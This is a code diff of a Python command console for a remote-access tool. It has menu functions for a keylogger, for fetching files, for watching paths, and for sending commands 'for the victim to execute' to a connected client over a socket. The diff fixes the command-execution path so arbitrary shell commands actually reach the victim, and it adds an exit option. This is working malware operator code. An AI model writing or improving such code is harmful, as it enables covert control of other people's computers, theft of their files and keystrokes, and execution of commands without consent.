@@ -46,7 +46,7 @@ def keyl():
 
 
 def filet():
-    fileLocation = input("enter file location or type 1 to go back")
+    fileLocation = input("enter file location or type 1 to go back\n")
     if fileLocation == "1":
         return "-1"
     return "fget " + fileLocation
@@ -65,7 +65,7 @@ def watch():
         watch_menu()
         selection = input()
         if selection == "1":
-            filedir = input("enter the file/dir path")
+            filedir = input("enter the file/dir path\n")
             return "wstart " + filedir
         elif selection == "2":
             return "wstop"
@@ -79,9 +79,10 @@ def watch():
 
 def executec():
     while True:
-        command = input("type a command for the victim to execute or type 1 to go back")
+        command = input("type a command for the victim to execute or type 1 to go back\n")
         if command == "1":
-            break
+            return "-1"
+        return "e " + command
 
 
 def print_menu():
@@ -139,4 +140,6 @@ if __name__ == '__main__':
             command = main_menu(client_ip)
             while command == "-1":
                 command = main_menu(client_ip)
+            if command == "exit":
+                break
             client.sendall(str(command).encode())
